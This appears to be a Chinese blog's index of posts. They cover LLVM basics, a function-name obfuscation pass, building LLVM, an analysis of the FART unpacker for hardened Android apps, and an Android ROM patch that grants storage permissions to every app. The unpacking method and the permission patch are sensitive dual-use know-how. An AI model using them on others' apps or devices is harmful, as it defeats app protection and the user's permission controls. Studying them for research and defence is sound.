对上述4大层次来讲,次级都是上级的基本组成元素,我们可以通过以下代码来遍历Module中的每条指令. void printfModule(Module \u0026M){ for (Function \u0026F : M){ errs() \u003c\u003c \"\\n==================函数开始=========================\\n\"; errs() \u003c\u003c F.getName() \u003c\u003c \":\\n\"; for (BasicBlock \u0026BB : F){ errs() \u003c\u003c BB.getName() \u003c\u003c \":\\n\"; for (Instruction \u0026I : BB) { errs() \u003c\u003c I \u003c\u003c \"\\n\"; } } errs() \u003c\u003c \"\\n==================函数结束=========================\\n\"; } } ","date":"2023-03-15","objectID":"/posts/llvm/llvm%E5%9F%BA%E7%A1%80/:0:0","tags":["LLVM"],"title":"LLVM基础","uri":"/posts/llvm/llvm%E5%9F%BA%E7%A1%80/"},{"categories":["LLVM"],"content":"测试代码 //luoTst.c #include \u003cstdio.h\u003e void fun1() { printf(\"hello clang: fun1\\r\\n\"); } void fun2() { printf(\"hello clang: fun2\\r\\n\"); } int main(int argc, char const *argv[]) { if (argc \u003e 2) { printf(\"hello world!\\r\\n\"); } else { printf(\"hello LuoHun!\\r\\n\"); } fun1(); fun2(); return 0; } ","date":"2023-03-15","objectID":"/posts/llvm/%E5%87%BD%E6%95%B0%E5%90%8D%E7%A7%B0%E5%8A%A0%E5%AF%86pass%E5%BC%80%E5%8F%91/:1:0","tags":["LLVM"],"title":"函数名称加密Pass开发","uri":"/posts/llvm/%E5%87%BD%E6%95%B0%E5%90%8D%E7%A7%B0%E5%8A%A0%E5%AF%86pass%E5%BC%80%E5%8F%91/"},{"categories":["LLVM"],"content":"基于源码编写Pass 在{llvm-project}/llvm/lib/Transforms目录下新建一个文件夹EncodeFunctionName 在EncodeFunctionName文件夹下新建一个CMakeLists.txt文件 add_llvm_library( LLVMEncodeFunctionName MODULE EncodeFunctionName.cpp PLUGIN_TOOL opt ) 在新建文件夹的上层即lib/Transforms/CMakeLists.txt文件中填入下面内容 add_subdirectory(EncodeFunctionName) Reload Cmake Project 在EncodeFunctionName文件夹下新建一个EncodeFunctionName.cpp文件. #include \"llvm/Pass.h\" #include \"llvm/IR/Function.h\" #include \"llvm/Support/raw_ostream.h\" using namespace llvm; namespace { struct EncodeFunctionName : public FunctionPass { static char ID; EncodeFunctionName() : FunctionPass(ID) {} bool runOnFunction(Function \u0026F) override { errs() \u003c\u003c \"Encode Function Name: \"\u003c\u003cF.getName()\u003c\u003c\" -\u003e \"; if(F.getName().compare(\"main\") != 0){ llvm::MD5 Hasher; llvm::MD5::MD5Result Hash; Hasher.update(\"luohun_\"); Hasher.update(F.getName()); Hasher.final(Hash); SmallString\u003c32\u003e HexString; llvm::MD5::stringifyResult(Hash, HexString); F.setName(HexString); } errs().write_escaped(F.getName()) \u003c\u003c '\\n'; return false; } }; // end of struct EncodeFunctionName } char EncodeFunctionName::ID = 0; static RegisterPass\u003cEncodeFunctionName\u003e X(\"encode\", \"Encode Function Name Pass\", false /* Only looks at CFG */, false /* Analysis Pass */); 在{llvm-project}/llvm/cmake-build-release目录下执行下述命令即可进行编译 ninja LLVMEncodeFunctionName 使用opt来测试pass //生成.ll文件 clang -emit-llvm -S luoTst.c -o luoTst.ll //使用opt进行测试 opt -load /home/luohun/Desktop/llvm-project-9.0.1/llvm/cmake-build-release/lib/LLVMEncodeFunctionName.so -encode luoTst.ll -o luoTst.bc ","date":"2023-03-15","objectID":"/posts/llvm/%E5%87%BD%E6%95%B0%E5%90%8D%E7%A7%B0%E5%8A%A0%E5%AF%86pass%E5%BC%80%E5%8F%91/:2:0","tags":["LLVM"],"title":"函数名称加密Pass开发","uri":"/posts/llvm/%E5%87%BD%E6%95%B0%E5%90%8D%E7%A7%B0%E5%8A%A0%E5%AF%86pass%E5%BC%80%E5%8F%91/"},{"categories":["LLVM"],"content":"脱离源码编写Pass 项目布局如下: \u003cproject dir\u003e/ | CMakeLists.txt \u003cpass name\u003e/ | CMakeLists.txt Pass.cpp ... 新建一个项目文件夹如 passDev 在passDev文件夹下新建一个CMakeLists.txt文件,内容如下: #前3项根据自身情况来 cmake_minimum_required(VERSION 3.24) project(passDev) set(LLVM_DIR /home/luohun/Desktop/llvm-project-9.0.1/build_debug/lib/cmake/llvm/) find_package(LLVM REQUIRED CONFIG) list(APPEND CMAKE_MODULE_PATH \"${LLVM_CMAKE_DIR}\") include(AddLLVM) separate_arguments(LLVM_DEFINITIONS_LIST NATIVE_COMMAND ${LLVM_DEFINITIONS}) add_definitions(${LLVM_DEFINITIONS_LIST}) include_directories(${LLVM_INCLUDE_DIRS}) add_subdirectory(EncodeFunctionName) 在passDev文件夹下新建一个Pass文件夹如 EncodeFunctionName 在EncodeFunctionName文件夹下新建一个CMakeLists.txt文件,内容如下: add_llvm_library(LLVMEncodeFunctionName2 MODULE EncodeFunctionName.cpp ) 在EncodeFunctionName文件夹下新建一个EncodeFunctionName.cpp文件,内容如下: #include \"llvm/Pass.h\" #include \"llvm/IR/Function.h\" #include \"llvm/Support/raw_ostream.h\" using namespace llvm; namespace { struct EncodeFunctionName : public FunctionPass { static char ID; EncodeFunctionName() : FunctionPass(ID) {} bool runOnFunction(Function \u0026F) override { errs() \u003c\u003c \"Encode Function Name: \"\u003c\u003cF.getName()\u003c\u003c\" -\u003e \"; if(F.getName().compare(\"main\") != 0){ llvm::MD5 Hasher; llvm::MD5::MD5Result Hash; Hasher.update(\"luohun_\"); Hasher.update(F.getName()); Hasher.final(Hash); SmallString\u003c32\u003e HexString; llvm::MD5::stringifyResult(Hash, HexString); F.setName(HexString); } errs().write_escaped(F.getName()) \u003c\u003c '\\n'; return false; } }; // end of struct EncodeFunctionName } char EncodeFunctionName::ID = 0; static RegisterPass\u003cEncodeFunctionName\u003e X(\"encode\", \"Encode Function Name Pass\", false /* Only looks at CFG */, false /* Analysis Pass */); 用CLion打开该项目,点击build即可进行编译. 接下来就可以使用下述命令来进行混淆并生成bc文件 opt -load /home/luohun/Desktop/luo/passDev/cmake-build-debug/EncodeFunctionName/LLVMEncodeFunctionName2.so -encode luoTst.ll -o luoTst.bc ","date":"2023-03-15","objectID":"/posts/llvm/%E5%87%BD%E6%95%B0%E5%90%8D%E7%A7%B0%E5%8A%A0%E5%AF%86pass%E5%BC%80%E5%8F%91/:3:0","tags":["LLVM"],"title":"函数名称加密Pass开发","uri":"/posts/llvm/%E5%87%BD%E6%95%B0%E5%90%8D%E7%A7%B0%E5%8A%A0%E5%AF%86pass%E5%BC%80%E5%8F%91/"},{"categories":["LLVM"],"content":"Pass注册到Clang中 编译llvm自定义混淆的Pass后,使用opt进行pass加载混淆bc文件这个步骤很麻烦,下面以llvm9.0.1为例将llvm pass添加到clang的命令行 创建头文件,在{llvm-project}/llvm/include/llvm/Transforms目录下,新建一个EncodeFunctionName文件夹,在里面再新建一个EncodeFunctionName.h #ifndef LLVM_ENCODEFUNCTIONNAME_H #define LLVM_ENCODEFUNCTIONNAME_H #include \"llvm/Pass.h\" namespace llvm{ Pass* createEncodeFunctionName(); } #endif // LLVM_ENCODEFUNCTIONNAME_H 在{llvm-project}/llvm/lib/Transforms/EncodeFunctionName/EncodeFunctionName.cpp文件中进行实现 #include \"llvm/Pass.h\" #include \"llvm/IR/Function.h\" #include \"llvm/Support/raw_ostream.h\" #include \"llvm/Transforms/EncodeFunctionName/EncodeFunctionName.h\" using namespace llvm; namespace { struct EncodeFunctionName : public FunctionPass { static char ID; EncodeFunctionName() : FunctionPass(ID) {} bool runOnFunction(Function \u0026F) override { errs() \u003c\u003c \"Encode Function Name: \"\u003c\u003cF.getName()\u003c\u003c\" -\u003e \"; if(F.getName().compare(\"main\") != 0){ llvm::MD5 Hasher; llvm::MD5::MD5Result Hash; Hasher.update(\"luohun_\"); Hasher.update(F.getName()); Hasher.final(Hash); SmallString\u003c32\u003e HexString; llvm::MD5::stringifyResult(Hash, HexString); F.setName(HexString); } errs().write_escaped(F.getName()) \u003c\u003c '\\n'; return false; } }; // end of struct EncodeFunctionName } char EncodeFunctionName::ID = 0; static RegisterPass\u003cEncodeFunctionName\u003e X(\"encode\", \"Encode Function Name Pass\", false /* Only looks at CFG */, false /* Analysis Pass */); //实现该函数 Pass* llvm::createEncodeFunctionName(){return new EncodeFunctionName();} 修改{llvm-project}/llvm/lib/Transforms/EncodeFunctionName/CMakeLists.txt内容如下: add_llvm_library( LLVMEncodeFunctionName EncodeFunctionName.cpp ADDITIONAL_HEADER_DIRS ${LLVM_MAIN_INCLUDE_DIR}/llvm/Transforms ${LLVM_MAIN_INCLUDE_DIR}/llvm/Transforms/EncodeFunctionName DEPENDS intrinsics_gen ) 在{llvm-project}/llvm/lib/Transforms/EncodeFunctionName下新建一个LLVMBuild.txt [component_0] type = Library name = EncodeFunctionName parent = Transforms library_name = EncodeFunctionName 在{llvm-project}/llvm/lib/Transforms/LLVMBuild.txt文件中添加EncodeFunctionName [common] subdirectories = AggressiveInstCombine Coroutines IPO InstCombine Instrumentation Scalar Utils Vectorize ObjCARC EncodeFunctionName 在{llvm-project}/llvm/lib/Transforms/IPO/LLVMBuild.txt文件中添加EncodeFunctionName required_libraries = AggressiveInstCombine Analysis BitReader BitWriter Core InstCombine IRReader Linker Object ProfileData Scalar Support TransformUtils Vectorize Instrumentation EncodeFunctionName 修改{llvm-project}/llvm/lib/Transforms/IPO/PassManagerBuilder.cpp文件,添加启动参数识别 #include \"llvm/Transforms/EncodeFunctionName/EncodeFunctionName.h\" static cl::opt\u003cbool\u003e EnableEncodeFunctionName(\"encode\", cl::init(false), cl::Hidden, cl::ZeroOrMore, cl::desc(\"Encode Name Function Pass\")); void PassManagerBuilder::populateModulePassManager( legacy::PassManagerBase \u0026MPM) { //--- if (EnableEncodeFunctionName){ MPM.add(createEncodeFunctionName()); } //--- } 在{llvm-project}/llvm/cmake-build-release进行编译 ninja LLVMEncodeFunctionName ninja clang 用编译出的clang去编译上面的测试文件 clang -mllvm -encode luoTst.ll -o luoTst.bc 注意 上面的方法从llvm12.0.0开始已不再适用,因为从llvm12.0.0版本开始已经将LLVMBuild.txt文件删除了,取而代之的是一种纯粹的CMake方法. ","date":"2023-03-15","objectID":"/posts/llvm/%E5%87%BD%E6%95%B0%E5%90%8D%E7%A7%B0%E5%8A%A0%E5%AF%86pass%E5%BC%80%E5%8F%91/:4:0","tags":["LLVM"],"title":"函数名称加密Pass开发","uri":"/posts/llvm/%E5%87%BD%E6%95%B0%E5%90%8D%E7%A7%B0%E5%8A%A0%E5%AF%86pass%E5%BC%80%E5%8F%91/"},{"categories":["LLVM"],"content":"参考链接 WritingAnLLVMPass developing-llvm-passes-out-of-source LLVM 12.0.0 发布 ","date":"2023-03-15","objectID":"/posts/llvm/%E5%87%BD%E6%95%B0%E5%90%8D%E7%A7%B0%E5%8A%A0%E5%AF%86pass%E5%BC%80%E5%8F%91/:5:0","tags":["LLVM"],"title":"函数名称加密Pass开发","uri":"/posts/llvm/%E5%87%BD%E6%95%B0%E5%90%8D%E7%A7%B0%E5%8A%A0%E5%AF%86pass%E5%BC%80%E5%8F%91/"},{"categories":["LLVM"],"content":"llvm的官网：https://llvm.org/ 下面展示下用Ubuntu20.04来编译llvm9.0.1 ","date":"2023-03-13","objectID":"/posts/llvm/%E5%88%9D%E8%AF%86llvm/:0:0","tags":["LLVM"],"title":"初识LLVM","uri":"/posts/llvm/%E5%88%9D%E8%AF%86llvm/"},{"categories":["LLVM"],"content":"源码编译 准备编译环境 sudo apt update sudo apt install gcc g++ cmake ninja-build 下载llvm源码 https://github.com/llvm/llvm-project wget https://github.com/llvm/llvm-project/releases/download/llvmorg-9.0.1/llvm-project-9.0.1.tar.xz //将.xz解压为.tar xz -dk llvm-project-9.0.1.tar.xz //将.tar解压为普通文件 tar -xvf llvm-project-9.0.1.tar 开始编译 https://llvm.org/docs/GettingStarted.html //Debug cd llvm-project-9.0.1 mkdir build_debug cd build_debug cmake -DLLVM_ENABLE_PROJECTS=\"clang\" ../llvm make //Release版 cd llvm-project-9.0.1 mkdir build_release cd build_release/ cmake -G Ninja -DCMAKE_BUILD_TYPE=RELEASE -DLLVM_ENABLE_PROJECTS=\"clang\" ../llvm ninja -j8 -G Ninja: 表示生成Ninja系统的构建文件,可选的构建系统有Ninja、Unix Makefiles、Visual Studio、Xcode -DCMAKE_BUILD_TYPE=RELEASE: 表示生成Release版本的LLVM,此值默认是Debug -DLLVM_TARGETS_TO_BUILD=“X86”: 表示编译的目标平台是X86平台,可选的目标机器有AArch64、AMDGPU、ARM、BPF、Hexagon、Lanai、Mips、MSP430、NVPTX、PowerPC、RISCV、Sparc、SystemZ、WebAssembly、X86、XCore -DLLVM_ENABLE_PROJECTS=“clang”: 表示我们除了编译LLVM以外,还要编译clang.如果还需要编译其他工具,则在后面添加,并用分号分割.比如,要编译clang和lldb,则需要设置为-DLLVM_ENABLE_PROJECTS=“clang;lldb” -DLLVM_OPTIMIZED_TABLEGEN=ON: 仅对Debug模式有效,开启此选项可提高编译速度 ","date":"2023-03-13","objectID":"/posts/llvm/%E5%88%9D%E8%AF%86llvm/:1:0","tags":["LLVM"],"title":"初识LLVM","uri":"/posts/llvm/%E5%88%9D%E8%AF%86llvm/"},{"categories":["LLVM"],"content":"Clion编译 用Clion打开llvm的CMakeLists.txt文件 配置Release选项 -G Ninja -DLLVM_ENABLE_PROJECTS=\"clang\" 在上述的debug或者release目录下执行下述命令,即可开始编译. ninja -j8 ","date":"2023-03-13","objectID":"/posts/llvm/%E5%88%9D%E8%AF%86llvm/:2:0","tags":["LLVM"],"title":"初识LLVM","uri":"/posts/llvm/%E5%88%9D%E8%AF%86llvm/"},{"categories":["LLVM"],"content":"常用工具 名称 功能 输入文件后缀 输出文件后缀 参数 clang C编译器 .c .ll -emit-llvm -S clang++ C++编译器 .cpp .ll -emit-llvm -S llvm-as llvm汇编 .ll .bc llvm-dis llvm反汇编 .bc .ll lli llvm解释器 .ll llc llvm后端编译器 .ll .s opt 优化器 .bc/.ll .bc //常用指令如下 //.c -\u003e .ll clang -emit-llvm -S luoTst.c -o luoTst.ll //.c -\u003e .bc clang -emit-llvm -c luoTst.c -o luoTst.bc //.ll -\u003e .bc llvm-as luoTst.ll -o luoTst.bc //.bc -\u003e .ll llvm-dis luoTst.bc -o luoTst.ll //执行ll lli luoTst.ll //.bc -\u003e .s llc luoTst.bc -o luoTst.s ","date":"2023-03-13","objectID":"/posts/llvm/%E5%88%9D%E8%AF%86llvm/:3:0","tags":["LLVM"],"title":"初识LLVM","uri":"/posts/llvm/%E5%88%9D%E8%AF%86llvm/"},{"categories":["Android壳世界"],"content":"前言 Android应用保护发展的早期,通过对Dex整体进行加密或隐藏来完成对Dex的保护,也称之为一代壳.这时候侧重于对Dex的整体保护,相应的对Dex文件进行整体的Dump也就完成了脱壳.随着Android加固的发展,对Dex文件的保护也就提升到了函数粒度,通过对Dex中的函数指令进行抽取来抗衡Dex的整体Dump.在Android Dalvik环境下FUPK3通过引入主动调用思想,完美的解决了指令抽取型壳,但可惜的是该项目基于Android 4.4.4_r1进行开发,当下很多App已经不支持在Android4.4下安装运行.在Android ART环境下的今天,Fart基于主动调用的思想再加上将对Dex的Dump提升了到函数粒度,可有效来解决指令抽取型壳. ","date":"2022-11-11","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/fart%E6%B5%81%E7%A8%8B%E5%92%8C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/:1:0","tags":["Android"],"title":"Fart流程和原理分析","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/fart%E6%B5%81%E7%A8%8B%E5%92%8C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"},{"categories":["Android壳世界"],"content":"流程分析 Fart的入口函数在frameworks\\base\\core\\java\\android\\app\\ActivityThread.java的performLaunchActivity中. public private Activity performLaunchActivity(ActivityClientRecord r, Intent customIntent) { //--------- //启动fart线程 fartthread(); } 查看fartthread()函数,可以知道fart是在App启动1分钟后才开始调用fart()函数进行工作. public static void fartthread() { new Thread(new Runnable() { @Override public void run() { // TODO Auto-generated method stub try { Log.e(\"ActivityThread\", \"start sleep......\"); Thread.sleep(1 * 60 * 1000); } catch (InterruptedException e) { // TODO Auto-generated catch block e.printStackTrace(); } Log.e(\"ActivityThread\", \"sleep over and start fart\"); fart(); Log.e(\"ActivityThread\", \"fart run over\"); } }).start(); } 在fart()函数中,首先调用getClassloader()函数,拿到加固应用最终通过反射设置后的Classloader. 代码中提供了以下两种方式拿到Classloader对象: 通过反射调用ActivityThread类中的静态函数currentActivityThread(),拿到ActivityThread的静态实例对象sCurrentActivityThread,再通过反射拿到ActivityThread实例对象中的mInitialApplication成员. 通过反射拿到ActivityThread实例对象中的mBoundApplication成员,再反射拿到AppBindData对象的info成员,info的类型是LoadedApk,而在LoadedApk中存在一个成员mApplication,通过该成员可以拿到最终的Classloader对象. 通过对Android源码进行分析,可以知道上面两种方式拿到的Application对象mInitialApplication和mApplication,其实是一个值. http://androidxref.com/8.1.0_r33/xref/frameworks/base/core/java/android/app/ActivityThread.java http://androidxref.com/8.1.0_r33/xref/frameworks/base/core/java/android/app/LoadedApk.java 另外考虑到壳有两种情况来完成ClassLoader的替换,故下方的代码中也进行了两次fartwithClassloader函数的调用. 替换系统组件类加载器为壳的ClassLoader,同时设置壳ClassLoader的parent为系统组件类加载器. 打破原有的双亲关系,在系统组件类加载器和BootClassLoader的中间插入壳的ClassLoader. public static ClassLoader getClassloader() { ClassLoader resultClassloader = null; Object currentActivityThread = invokeStaticMethod( \"android.app.ActivityThread\", \"currentActivityThread\", new Class[]{}, new Object[]{}); Object mBoundApplication = getFieldOjbect( \"android.app.ActivityThread\", currentActivityThread, \"mBoundApplication\"); Application mInitialApplication = (Application) getFieldOjbect(\"android.app.ActivityThread\", currentActivityThread, \"mInitialApplication\"); Object loadedApkInfo = getFieldOjbect( \"android.app.ActivityThread$AppBindData\", mBoundApplication, \"info\"); Application mApplication = (Application) getFieldOjbect(\"android.app.LoadedApk\", loadedApkInfo, \"mApplication\"); resultClassloader = mApplication.getClassLoader(); return resultClassloader; } public static void fart() { ClassLoader appClassloader = getClassloader(); ClassLoader tmpClassloader=appClassloader; ClassLoader parentClassloader=appClassloader.getParent(); if(appClassloader.toString().indexOf(\"java.lang.BootClassLoader\")==-1) { fartwithClassloader(appClassloader); } while(parentClassloader!=null){ if(parentClassloader.toString().indexOf(\"java.lang.BootClassLoader\")==-1) { fartwithClassloader(parentClassloader); } tmpClassloader=parentClassloader; parentClassloader=parentClassloader.getParent(); } } 在fartwithClassloader函数中,通过以下步骤遍历Dex中的所有函数并完成了主动调用. 通过反射拿到当前类加载器的DexPathList对象,进而拿到Element对象数组,Element类中存放着Dex的路径等信息. 遍历Element对象数组,拿到每一个Element对象的DexFile对象,接着通过反射拿到DexFile对象中的mCookie成员(指向当前Dex文件在内存的首地址). 利用Android内部封装好的函数getClassNameList,传入mCookie拿到Dex文件中所有的类名. 遍历Dex中所有类名,利用loadClassAndInvoke函数完成主动加载和调用. 需要注意的一点就是下方的dumpMethodCode函数至关重要,是fart新增的一个函数,且看后面对该函数的分析. public static void fartwithClassloader(ClassLoader appClassloader) { List\u003cObject\u003e dexFilesArray = new ArrayList\u003cObject\u003e(); Field pathList_Field = (Field) getClassField(appClassloader, \"dalvik.system.BaseDexClassLoader\", \"pathList\"); Object pathList_object = getFieldOjbect(\"dalvik.system.BaseDexClassLoader\", appClassloader, \"pathList\"); Object[] ElementsArray = (Object[]) getFieldOjbect(\"dalvik.system.DexPathList\", pathList_object, \"dexElements\"); Field dexFile_fileField = null; try { dexFile_fileField = (Field) getClassField(appClassloader, \"dalvik.system.DexPathList$Element\", \"dexFile\"); } catch (Exception e) { e.printStackTrace(); } catch (Error e) { e.printStackTrace(); } Class DexFileClazz = null; try { DexFileClazz = appClassloader.loadClass(\"dalvik.system.DexFile\"); } ","date":"2022-11-11","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/fart%E6%B5%81%E7%A8%8B%E5%92%8C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/:2:0","tags":["Android"],"title":"Fart流程和原理分析","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/fart%E6%B5%81%E7%A8%8B%E5%92%8C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"},{"categories":["Android壳世界"],"content":"原理分析 从上面的流程分析中,仿佛没有感受到主动调用的存在,接下来进行fart主动调用原理层的讲解. ","date":"2022-11-11","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/fart%E6%B5%81%E7%A8%8B%E5%92%8C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/:3:0","tags":["Android"],"title":"Fart流程和原理分析","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/fart%E6%B5%81%E7%A8%8B%E5%92%8C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"},{"categories":["Android壳世界"],"content":"单个函数主动调用 这里我们从Android C层调用Java层方法的正常流程进行出发,通过跟踪Android源码来看下系统是如何完成在C层对Java层函数的调用. JNIEXPORT jint luoJni(JNIEnv *env, jint n1, jint n2) { //①通过FindClass拿到类名 jclass mainActivityClazz = env-\u003eFindClass(\"com/example/luodst/MainActivity\"); //②通过GetXXXMethodID拿到类中的方法 jmethodID luoAdd = env-\u003eGetStaticMethodID(mainActivityClazz, \"luoAdd\", \"(II)I\"); //③通过CallXXXMethod来调用方法. int nResult = env-\u003eCallStaticIntMethod(mainActivityClazz, luoAdd, n1, n2); return nResult; } FindClass源码跟踪如下: //http://androidxref.com/8.1.0_r33/xref/art/runtime/jni_internal.cc static jclass FindClass(JNIEnv* env, const char* name) //http://androidxref.com/8.1.0_r33/xref/art/runtime/class_linker.cc -\u003emirror::Class* ClassLinker::FindClass(Thread* self, const char* descriptor, Handle\u003cmirror::ClassLoader\u003e class_loader) 这里可以看到是通过调用ClassLinker类的FindClass完成对指定类的查找. GetXXXMethodID源码跟踪如下: //http://androidxref.com/8.1.0_r33/xref/art/runtime/jni_internal.cc static jmethodID GetStaticMethodID(JNIEnv* env, jclass java_class, const char* name, const char* sig) -\u003estatic jmethodID FindMethodID(ScopedObjectAccess\u0026 soa, jclass jni_class, const char* name, const char* sig, bool is_static) //http://androidxref.com/8.1.0_r33/xref/art/runtime/jni_internal.cc static jmethodID GetMethodID(JNIEnv* env, jclass java_class, const char* name, const char* sig) -\u003estatic jmethodID FindMethodID(ScopedObjectAccess\u0026 soa, jclass jni_class, const char* name, const char* sig, bool is_static) 这里可以看到C层的GetXXXMethodID函数最终都是通过调用FindMethodID函数进行类方法的查找,这里我们同时也注意到了jmethodID其实是可以和ArtMethod*类型进行互转的. CallXXXMethod源码跟踪如下: //http://androidxref.com/8.1.0_r33/xref/art/runtime/jni_internal.cc static jint CallStaticIntMethod(JNIEnv* env, jclass, jmethodID mid, ...) //http://androidxref.com/8.1.0_r33/xref/art/runtime/reflection.cc -\u003eJValue InvokeWithVarArgs(const ScopedObjectAccessAlreadyRunnable\u0026 soa, jobject obj, jmethodID mid, va_list args) static void InvokeWithArgArray(const ScopedObjectAccessAlreadyRunnable\u0026 soa, ArtMethod* method, ArgArray* arg_array, JValue* result, const char* shorty) //http://androidxref.com/8.1.0_r33/xref/art/runtime/art_method.cc -\u003evoid ArtMethod::Invoke(Thread* self, uint32_t* args, uint32_t args_size, JValue* result, const char* shorty) //http://androidxref.com/8.1.0_r33/xref/art/runtime/jni_internal.cc static void CallVoidMethod(JNIEnv* env, jobject obj, jmethodID mid, ...)\\ //http://androidxref.com/8.1.0_r33/xref/art/runtime/reflection.cc -\u003eJValue InvokeVirtualOrInterfaceWithVarArgs(const ScopedObjectAccessAlreadyRunnable\u0026 soa, jobject obj, jmethodID mid, va_list args) -\u003estatic void InvokeWithArgArray(const ScopedObjectAccessAlreadyRunnable\u0026 soa, ArtMethod* method, ArgArray* arg_array, JValue* result, const char* shorty) //http://androidxref.com/8.1.0_r33/xref/art/runtime/art_method.cc -\u003evoid ArtMethod::Invoke(Thread* self, uint32_t* args, uint32_t args_size, JValue* result, const char* shorty) 这里可以看到,原来平时我们在C层使用的CallXXXMethod函数进行Java层函数调用的底层是由该函数对应的ArtMethod对象的Invoke函数来完成的. 至此我们可以写出自己的主动调用函数了,在fart中该部分的体现主要在art/runtime/art_method.cc中的myfartInvoke函数中.另外有一点比较巧妙的就是在构造函数参数的时候通过将函数的第一个参数self置空,然后在ArtMethod类的Invoke函数中进行判断若是我们主动调用的就进行该函数方法体的Dump,不让其继续执行下去.同时在这里我们也注意到了fart对于函数主动调用的深度也就停留在了ArtMethod类的Invoke函数中,假设壳在Invoke函数之后才进行函数指令的解密以及方法体的填充,那么这是fart目前所不能解决的. ","date":"2022-11-11","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/fart%E6%B5%81%E7%A8%8B%E5%92%8C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/:3:1","tags":["Android"],"title":"Fart流程和原理分析","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/fart%E6%B5%81%E7%A8%8B%E5%92%8C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"},{"categories":["Android壳世界"],"content":"遍历Dex所有函数完成主动调用 加固应用的运行流程大致如下: 当壳在函数attachBaseContext和onCreate中执行完加密Dex文件的解密后,通过自定义的Classloader在内存中加载解密后的dex文件.为了解决后续应用在加载执行解密后的dex文件中的Class和Method的问题,接下来就是通过利用java的反射修复一系列的变量.其中最为重要的一个变量就是应用运行中的Classloader,这里面包含着App真实的业务代码.因此,只要获取到加固应用最终通过反射设置后的Classloader,我们就可以通过一系列反射完成对加密代码的解密. Fart的入口时机选在ActivityThread类的performLaunchActivity函数中,这个函数是用来响应Activity相关的操作,当App在响应Activity消息时,壳已经完成了ClassLoader的替换.因此,此时通过反射利用fart内部的函数getClassloader拿到的就是加固应用最终通过反射设置后的Classloader.然后利用fartwithClassloader函数,对Classloader进行处理,经过一系列的反射拿到DexFile对象,利用android内部函数getClassNameList获取到Dex文件中所有的类名,最后通过主动加载的形式,获取每个类中的所有函数,进行函数的主动调用. 注意 在Fart中处理的Classloader是加固应用最终通过反射设置后的Classloader,但App在运行过程中也可以动态加载Dex文件,此时的Classloader并不在fart处理的范围内.对于这部分代码的处理,fart提供了一个函数fartwithClassloader,需要结合frida进行使用. ","date":"2022-11-11","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/fart%E6%B5%81%E7%A8%8B%E5%92%8C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/:3:2","tags":["Android"],"title":"Fart流程和原理分析","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/fart%E6%B5%81%E7%A8%8B%E5%92%8C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"},{"categories":["Android壳世界"],"content":"总结 Fart的流程图如下: 其脱壳步骤主要分为以下三步: 内存中DexFile结构体完整Dex的Dump 主动调用类中的每一个方法,并实现对应CodeItem的Dump 通过主动调用Dump下来方法的CodeItem进行Dex中被抽取方法的修复 在Android ART环境下,Fart提出了一种针对指令抽取型壳的解决方案,很值得我们进行研究学习.同样我们可以站在巨人的肩膀上,进行更深层次的主动调用链构造以及将Fart与Frida相结合为我们破开Android应用分析的第一层壁垒,降低Android应用分析的难度. ","date":"2022-11-11","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/fart%E6%B5%81%E7%A8%8B%E5%92%8C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/:4:0","tags":["Android"],"title":"Fart流程和原理分析","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/fart%E6%B5%81%E7%A8%8B%E5%92%8C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"},{"categories":["Android壳世界"],"content":"参考链接 FART：ART环境下基于主动调用的自动化脱壳方案 ","date":"2022-11-11","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/fart%E6%B5%81%E7%A8%8B%E5%92%8C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/:5:0","tags":["Android"],"title":"Fart流程和原理分析","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/fart%E6%B5%81%E7%A8%8B%E5%92%8C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"},{"categories":["Android Rom"],"content":"前言 下面实验基于Android8.1源码,通过对Android源码的修改,让所有App都具备sdcard权限. ","date":"2022-11-07","objectID":"/posts/android/android-rom/%E6%B7%BB%E5%8A%A0sdcard%E6%9D%83%E9%99%90/:1:0","tags":["Android"],"title":"给所有App添加sdcard权限","uri":"/posts/android/android-rom/%E6%B7%BB%E5%8A%A0sdcard%E6%9D%83%E9%99%90/"},{"categories":["Android Rom"],"content":"修改 在frameworks/base/core/java/android/content/pm/PackageParser.java文件中的函数parseBaseApkCommon的while ((type = parser.next()) != XmlPullParser.END_DOCUMENT循环上加入下面的代码. String addPermissionName = \"android.permission.WRITE_EXTERNAL_STORAGE\"; int luoIndex = pkg.requestedPermissions.indexOf(addPermissionName); // if hasn't needPermission if (luoIndex == -1){ pkg.requestedPermissions.add(addPermissionName.intern()); Slog.w(\"LuoHunPermissions\",\"android.permission.WRITE_EXTERNAL_STORAGE\" ); } addPermissionName=\"android.permission.READ_EXTERNAL_STORAGE\"; luoIndex = pkg.requestedPermissions.indexOf(addPermissionName); if (luoIndex == -1){ pkg.requestedPermissions.add(addPermissionName.intern()); Slog.w(\"LuoHunPermissions\",\"android.permission.WRITE_EXTERNAL_STORAGE\" ); } 